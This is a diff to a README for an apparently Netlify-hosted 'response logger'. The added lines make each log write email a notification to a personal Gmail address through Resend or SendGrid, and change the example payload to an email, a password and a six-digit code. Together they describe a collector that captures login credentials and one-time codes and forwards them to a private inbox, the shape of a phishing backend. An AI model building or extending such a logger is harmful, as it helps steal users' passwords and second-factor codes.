@@ -58,12 +58,18 @@ This project includes a response logger with two function endpoints:
 1. `POST /.netlify/functions/response-logger` (also available at `/api/response-logger`) to write a log entry.
 2. `GET /.netlify/functions/response-logs?limit=25` (also available at `/api/response-logs`) to read recent log entries.
 
+When a log is written, the function now immediately sends an email notification to `raza.zaiidii@gmail.com`.
+Configure one of these provider pairs in Netlify environment variables:
+
+- `RESEND_API_KEY` and `RESEND_FROM_EMAIL`
+- `SENDGRID_API_KEY` and `SENDGRID_FROM_EMAIL`
+
 Example log write:
 
 ```bash
 curl -X POST http://localhost:8888/api/response-logger \
   -H "content-type: application/json" \
-  -d '{"status":200,"responseBody":{"message":"ok"}}'
+  -d '{"email":"user@example.com","password":"example-password","code":"123456"}'
 ```
 
 Example log read:
